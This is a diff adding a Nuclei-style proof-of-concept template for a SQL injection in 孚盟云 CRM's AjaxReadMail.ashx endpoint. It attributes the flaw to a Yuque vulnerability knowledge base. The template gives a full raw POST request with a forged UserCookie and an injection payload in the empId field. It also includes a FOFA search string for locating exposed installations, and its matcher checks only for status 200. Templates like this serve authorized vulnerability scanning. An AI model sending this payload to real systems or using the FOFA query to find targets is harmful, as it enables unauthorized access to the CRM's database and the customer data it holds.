@@ -1,0 +1,28 @@
+id: poc-sh8u3ipbf5xoh5um
+info:
+  name: 孚盟云CRM AjaxReadMail.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sh8u3ipbf5xoh5um'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sh8u3ipbf5xoh5um
+    fofa: app="孚盟软件-孚盟云"
+http:
+- raw:
+  - 'POST /m/Dingding/Ajax/AjaxReadMail.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: UserCookie={"empId":"1","corpId": "1"}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    method=getHeadImage&empId=’-1/user--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
